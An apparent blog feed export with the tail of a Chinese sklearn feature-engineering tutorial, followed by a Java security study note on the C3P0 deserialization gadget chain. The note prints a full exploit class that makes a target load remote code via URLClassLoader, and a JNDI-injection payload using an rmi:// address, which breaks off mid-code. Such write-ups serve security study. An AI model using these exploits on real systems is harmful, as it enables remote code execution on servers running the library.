)</li></ul><p>X:字典或者字典的迭代器，返回sparse（稀疏）矩阵</p><ul><li>inverse_transform(X)</li></ul><p>X:array或者sparse矩阵，返回值：转化之前的数据格式</p><ul><li>get_feature_names_out(X)</li></ul><p>X:前面得到的特征矩阵,返回类别名称</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>feature_extraction <span class="token keyword">import</span> DictVectorizerdata<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">{</span><span class="token string">"city"</span><span class="token punctuation">:</span><span class="token string">"北京"</span><span class="token punctuation">,</span><span class="token string">"temperature"</span><span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"city"</span><span class="token punctuation">:</span><span class="token string">"上海"</span><span class="token punctuation">,</span><span class="token string">"temperature"</span><span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"city"</span><span class="token punctuation">:</span><span class="token string">"广州"</span><span class="token punctuation">,</span><span class="token string">"temperature"</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span>dictVector<span class="token operator">=</span>DictVectorizer<span class="token punctuation">(</span>sparse<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>new_data<span class="token operator">=</span>dictVector<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>data<span class="token punctuation">)</span>names<span class="token operator">=</span>dictVector<span class="token punctuation">.</span>get_feature_names_out<span class="token punctuation">(</span>new_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>names<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>new_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>dictVector<span class="token punctuation">.</span>inverse_transform<span class="token punctuation">(</span>new_data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>应用场景：</p><p>若数据集类别多，先将数据集转为字典，再进行特征提权</p><h3 id="文本特征提取"><a href="#文本特征提取" class="headerlink" title="文本特征提取"></a>文本特征提取</h3><ol><li><strong>CountVectorizer</strong></li></ol><p>类：</p><p>sklearn.feature_extraction.text.CountVectorizer(stop_words=[])</p><p>stop_words:停用词，不纳入特征值的词</p><p>方法同字典特征提取</p><p>toarray()–将结果对象转为二维数组</p><p>将每条数据（句子）统计单词数</p><p>英文</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>feature_extraction<span class="token punctuation">.</span>text <span class="token keyword">import</span> CountVectorizerdata<span class="token operator">=</span><span class="token string">"I like to have a book.I like go to like good college and eat beef.I am a student of computer science"</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>count_vector <span class="token operator">=</span> CountVectorizer<span class="token punctuation">(</span><span class="token punctuation">)</span>new_data<span class="token operator">=</span>count_vector<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>new_data<span class="token punctuation">.</span>toarray<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>count_vector<span class="token punctuation">.</span>get_feature_names_out<span class="token punctuation">(</span>new_data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>中文需要进行词组间加空格</p><p>使用第三方库：jieba.cut()</p><ol><li><strong>Tf-idf文本特征提权</strong></li></ol><p>TF-IDF的主要思想是：如果某个词或者短语在一篇文章中出现的概率高，并且在其他文章很少出现，则认为此词或者短语具有很好的区分能力，适合用来分类。</p><p>TF-IDF作用： 用以评估一字词对于一个文件集或者一个语料库中其中一份文件的重要程度</p><p><strong>公式</strong></p><ul><li>词频（term frequency, tf）：指的是某一个给定的词语在该文件中出现的频率</li><li>逆向文档率（inverse document frequency,idf）：是一个词语普遍重要性的度量，</li></ul><p>某一个特定词语的idf,可以由总文件数目除以包含该词语之文件的数目，再将得到的商取以10为底的对数得到</p><p>$$tfidf_(ij)=tf_(ij) X idf_i$$</p><p>类：</p><p>sklearn.feature_extraction.text.TfidfVectorizer</p><h2 id="特征转化"><a href="#特征转化" class="headerlink" title="特征转化"></a>特征转化</h2><p>数值型数据的无量纲化：</p><ul><li>归一化</li><li>标准化</li></ul><p>API: </p><pre class="language-none"><code class="language-none">sklearn.preprocessing</code></pre><p>需求：</p><p>特征的单位或者大小相差较大，或者某特征的方差比其他特征要大出几个数量级，容易影响目标结果，使得一些算法无法学习到其它的特征</p><h3 id="归一化"><a href="#归一化" class="headerlink" title="归一化"></a>归一化</h3><ol><li><p>定义：通过原始数据进行变换把数据映射到默认为（0,1）之间</p></li><li><p>公式：</p></li></ol><p>$$X’=\frac{x-min}{max-min}$$</p><p>$$X’’=X’*(mx-mi)+mi$$</p><blockquote><p>作用于每一列，max为一列的最大值，min为一列最小值，那么X’为最终结果，mx,mi分别为指定区间,mx默认为1，mi默认为0</p></blockquote><ol><li>类：</li></ol><p>sklearn.preprocessing.MinMaxScaler(feature_range=(0,1)…)</p><p>方法：</p><ul><li>fit_transform(X) :返回处理后相同形状的数组</li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>datasets <span class="token keyword">as</span> datasets<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>preprocessing <span class="token keyword">import</span> MinMaxScaleriris<span class="token operator">=</span>datasets<span class="token punctuation">.</span>load_iris<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">for_one</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    scaler<span class="token operator">=</span>MinMaxScaler<span class="token punctuation">(</span><span class="token punctuation">)</span>    new_data<span class="token operator">=</span>scaler<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>iris<span class="token punctuation">.</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>new_data<span class="token punctuation">)</span></code></pre><ol><li>特点</li></ol><p>最大值和最小值容易受到异常点影响，所以只适合传统精确小数据场景</p><h3 id="标准化"><a href="#标准化" class="headerlink" title="标准化"></a>标准化</h3><ol><li>定义</li></ol><p>通过对原始数据进行变换把数据变换到均值为0，标准差为1范围内</p><ol><li>公式</li></ol><p>$$X’=\frac{x-mean}{\sigma}$$</p><blockquote><p>作用于每一列，mean为平均值，$$\sigma$$为标准差</p></blockquote><ol><li>类</li></ol><p>sklearn.preprocessing.StandardScaler()</p><p>方法：</p><ul><li>fit_transform(X) :返回处理后相同形状的数组</li></ul><ol><li>特点</li></ol><p>弥补了归一化缺陷</p><p>减少了一异常值对结果的影响，适合于大数据场景</p><h2 id="特征降维"><a href="#特征降维" class="headerlink" title="特征降维"></a>特征降维</h2><p>定义：指在某些限定条件下，降低随机变量（特征）个数，得到一组“不相关”主要量的过程</p><h3 id="特征选择"><a href="#特征选择" class="headerlink" title="特征选择"></a>特征选择</h3><ol><li>定义</li></ol><p>数据包含冗余相关变量（或称特征、属性、指标等），旨在从原有特征中找出主要特征</p><ol><li>方法</li></ol><p>Filter(过滤式)：主要探究特征本身特点、特征与特征和目标值之间关联</p><ul><li>方差选择法：低方差特征过滤</li><li>相关系数</li></ul><p>Embedded(嵌入式)：算法自动选择特征（特征与目标值之间的关联）</p><ul><li>决策树：信息熵、信息增益</li><li>正则化：L1,L2</li><li>深度学习：卷积等</li></ul><ol><li>模块</li></ol><pre class="language-python" data-language="python"><code class="language-python">sklearn<span class="token punctuation">.</span>feature_selection</code></pre><ol><li>过滤式</li></ol><p><strong>低方差特征过滤</strong></p><blockquote><p>删除低方差的一些特征</p></blockquote><p>类：sklearn.feature_selection.VarianceThreshold(threshold = 0.0)</p><p>删除所有的低方差特征</p><p>方法：</p><ul><li>fit_transform(X)：</li></ul><p>X:numpy数组</p><p>返回值：训练集差异低于threshold的特征将会被删除，默认是保持所有的特征，即方差非零特征，即删除所有样本中具有相同值的特征。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>datasets <span class="token keyword">as</span> datasets<span class="token keyword">from</span>  sklearn<span class="token punctuation">.</span>feature_selection <span class="token keyword">import</span> VarianceThresholdiris<span class="token operator">=</span>datasets<span class="token punctuation">.</span>load_iris<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">low_std</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    select<span class="token operator">=</span>VarianceThreshold<span class="token punctuation">(</span>threshold<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>    new_data <span class="token operator">=</span> select<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>iris<span class="token punctuation">.</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>new_data<span class="token punctuation">)</span></code></pre><p><strong>相关系数</strong></p><p>皮尔逊相关系数</p><ol><li>公式</li></ol><p>$$r= cov(X, Y) / (σ(X) * σ(Y))=\frac{\sum((X_i - \bar{X}) * (Y_i - \bar{Y}))}{\sqrt{\sum(X_i - \bar{X})^2 * \sum(Y_i - \bar{Y})^2}}$$</p><ol><li>特点</li></ol><ul><li>r&gt;0,正相关，r&lt;0,负相关，|r|&lt;=1</li><li>r=1时，两个变量完全相关，r=0时，两变量无相关关系</li><li>|r|&lt;0.4为低相关度，0.4&lt;=|r|&lt;0.7为显著性相关，|r|&gt;=0.7为高度线性相关</li></ul><ol><li>类</li></ol><p>scipy.stats.pearsonr(x,y)</p><p>X,Y为数组</p><p>返回值中的statistic属性为相关系数，pvalue属性为p 值（表示观察到的统计量在零假设成立的情况下（即两个变量之间没有线性关系）出现的概率）</p><pre class="language-python" data-language="python"><code class="language-python">r<span class="token operator">=</span>pearsonr<span class="token punctuation">(</span>iris<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>iris<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span></code></pre><h3 id="主成分分析"><a href="#主成分分析" class="headerlink" title="主成分分析"></a>主成分分析</h3><p>（PCA）</p><ol><li><p><strong>定义</strong>：高维度数据转化为低维度数据的过程，在此过程中可能会舍弃原有数据，创建新的变量</p></li><li><p><strong>作用</strong>：是数据维数压缩，尽可能降低原数据的维度（复杂度），损失少量信息</p></li><li><p><strong>应用</strong>：回归分析或者聚类分析当中</p></li><li><p>类</p></li></ol><p>sklearn.decomposition.PCA(n_components=None)</p><ul><li>将数据分解为较低维数空间</li><li>n_components<ul><li>float数据:表示保留百分比</li><li>int数据：减少到多少特征</li></ul></li></ul><p>fit_transform(X)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> sklearn </tag>
            
            <tag> 特征工程 </tag>
            
            <tag> 数据处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C3P0链</title>
      <link href="/2024/02/24/C3P0%E9%93%BE/"/>
      <url>/2024/02/24/C3P0%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://goodapple.top/archives/1749">Java安全学习——C3P0链 - 枫のBlog</a></p><p><a name="BScjw"></a></p><h1 id="C3P0介绍"><a href="#C3P0介绍" class="headerlink" title="C3P0介绍"></a>C3P0介绍</h1><pre class="language-text" data-language="text"><code class="language-text">C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。</code></pre><p>JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。<br>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p><br><a name="vDNj8"></a># Gadget&gt; 导入依赖<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.mchange<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>c3p0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.9.5.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><p>C3P0常见的利用方式有如下三种</p><ul><li>URLClassLoader远程类加载</li><li>JNDI注入</li><li>利用HEX序列化字节加载器进行反序列化攻击</li></ul><p><a name="wEy7I"></a></p><h2 id="URLClassLoader远程类加载"><a href="#URLClassLoader远程类加载" class="headerlink" title="URLClassLoader远程类加载"></a>URLClassLoader远程类加载</h2><p><a name="Gy11c"></a></p><h5 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h5><p>流程：PoolBackedDataSourceBase#readObject -&gt;ReferenceSerialized#getObject -&gt;ReferenceableUtils#referenceToObject -&gt;ObjectFactory#getObjectInstance</p><p>入口类：PoolBackedDataSourceBase<br>PoolBackedDataSourceBase#readObject<br>!<img src="/img/2-24/1.png"></p><p>如果反序列化得到的类是IndirectlySerialized的实例，则会调用其getObject()方法，然后将返回的类转为ConnectionPoolDataSource类</p><p>IndirectlySerialized是一个接口，查找实现类，找到ReferenceSerialized类<br>!<img src="/img/2-24/2.png"><br>在这里发现存在lookup方法，那么肯能这点就存在jndi注入，好吧但实际上在反序列化时我们是无法调用到该方法的，因为属性contextName为默认null且不可控<br>继续进入ReferenceableUtils#referenceToObject<br>这里reference我们放在后面EXP部分，怎么控制<br>!<img src="/img/2-24/3.png"><br>从第一个参数Reference ref获取URL,并使用URLClassLoader获取class类<br>forName进行类加载<br>newInstance实例。恶意类静态代码块和构造函数会被执行</p><p><a name="MLhzx"></a></p><h5 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h5><p>由于入口类writeObject的是connectionPoolDataSource属性，connectionPoolDataSource是一个接口没有继承Serializable接口（EXP就得实现这个接口才行），无法被直接序列化，因此走的是catch分支</p><p>!<img src="/img/2-24/4.png"><br>可以看到使用包装类包装了这个类。发现是一个接口的方法。<br>找到唯一的实现类ReferenceIndirector，<br>!<img src="/img/2-24/5.png"><br>调用Referenceable接口的getReference方法，那么我们的EXP就该实现这个接口，并返回我们恶意的Reference对象。</p><p>然后继续看ReferenceSerialized<br>!<img src="/img/2-24/6.png"><br>这里就赋值了上面Gadget最后要用的reference<br>!<img src="/img/2-24/7.png"><br>最后EXP</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token constant">C3P0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>mchange<span class="token punctuation">.</span>v2<span class="token punctuation">.</span>c3p0<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">PoolBackedDataSourceBase</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Referenceable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ConnectionPoolDataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">PooledConnection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLFeatureNotSupportedException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>logging<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">C3P0_URLClassLoader</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">EXP_Loader</span> <span class="token keyword">implements</span> <span class="token class-name">ConnectionPoolDataSource</span><span class="token punctuation">,</span> <span class="token class-name">Referenceable</span><span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">Reference</span> <span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"ExpClass"</span><span class="token punctuation">,</span><span class="token string">"exp"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:8888/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">PooledConnection</span> <span class="token function">getPooledConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">PooledConnection</span> <span class="token function">getPooledConnection</span><span class="token punctuation">(</span><span class="token class-name">String</span> user<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">PrintWriter</span> <span class="token function">getLogWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLogWriter</span><span class="token punctuation">(</span><span class="token class-name">PrintWriter</span> out<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLoginTimeout</span><span class="token punctuation">(</span><span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getLoginTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">Logger</span> <span class="token function">getParentLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLFeatureNotSupportedException</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">//序列化</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Pool_Serial</span><span class="token punctuation">(</span><span class="token class-name">ConnectionPoolDataSource</span> c<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token comment">//反射修改connectionPoolDataSource属性值为我们的恶意ConnectionPoolDataSource类</span>        <span class="token class-name">PoolBackedDataSourceBase</span> poolBackedDataSourceBase <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PoolBackedDataSourceBase</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> cls <span class="token operator">=</span> poolBackedDataSourceBase<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"connectionPoolDataSource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>poolBackedDataSourceBase<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//序列化流写入文件</span>        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"exp.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>poolBackedDataSourceBase<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//反序列化</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Pool_Deserial</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"exp.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">EXP_Loader</span> exp_loader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EXP_Loader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Pool_Serial</span><span class="token punctuation">(</span>exp_loader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Pool_Deserial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>URL所在目录下必须有包名的目录<br><a name="T9sRB"></a></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>这条链子依赖于fastjson或者Jackson、snakeyaml等反序列化漏洞,利用的是getter和setter方法<br><a name="CQJNO"></a></p><h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>流程</p><pre class="language-java" data-language="java"><code class="language-java">#修改jndiName<span class="token class-name">JndiRefConnectionPoolDataSource</span>#setJndiName <span class="token operator">-&gt;</span><span class="token class-name">JndiRefForwardingDataSource</span>#setJndiName #<span class="token constant">JNDI</span>调用<span class="token class-name">JndiRefConnectionPoolDataSource</span>#setLoginTime <span class="token operator">-&gt;</span><span class="token class-name">WrapperConnectionPoolDataSource</span>#setLoginTime <span class="token operator">-&gt;</span><span class="token class-name">JndiRefForwardingDataSource</span>#setLoginTimeout <span class="token operator">-&gt;</span><span class="token class-name">JndiRefForwardingDataSource</span>#inner <span class="token operator">-&gt;</span><span class="token class-name">JndiRefForwardingDataSource</span>#<span class="token function">dereference</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span><span class="token class-name">Context</span>#lookup</code></pre><p>JndiRefConnectionPoolDataSource#setLoginTimeout<br>!<img src="/img/2-24/8.png"><br>wcps是WrapperConnectionPoolDataSource类<br>!<img src="/img/2-24/9.png"><br>继续进入<br>!<img src="/img/2-24/10.png"><br>调式发现getNestedDataSource()返回的是JndiRefForwardingDataSource对象<br>!<img src="/img/2-24/11.png"><br>找到setLoginTimeout方法<br>!<img src="/img/2-24/12.png"><br>进入inner方法</p><p>!<img src="/img/2-24/13.png"><br>继续进入dereference方法<br>!<img src="/img/2-24/14.png"><br>最后在这里创建initialContext，并使用危险方法lookup。（到这里就有jndi注入了）<br>只需能控制jndiName就能够进行jndi注入</p><p>继续查看是否可控jndiName</p><p>JndiRefConnectionPoolDataSource#setJndiName</p><p>!<img src="/img/2-24/15.png"><br>jrfds为JndiRefForwardingDataSource对象，刚好跟上文对应<br>这里调用的是父类的setJndiName<br>进入JndiRefDataSourceBase#setJndiName<br>!<img src="/img/2-24/16.png"><br>这里对上面的jndiName赋值</p><p><a name="IbZOd"></a></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a name="X3Ocj"></a></p><h5 id="普通exp"><a href="#普通exp" class="headerlink" title="普通exp"></a><strong>普通exp</strong></h5><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">JndiRefConnectionPoolDataSource</span> jndiRefConnectionPoolDataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JndiRefConnectionPoolDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>jndiRefConnectionPoolDataSource<span class="token punctuation">.</span><span class="token function">setJndiName</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:8085/RFKMphyY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jndiRefConnectionPoolDataSource<span class="token punctuation">.</span><span class="token function">setLoginTimeout</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token 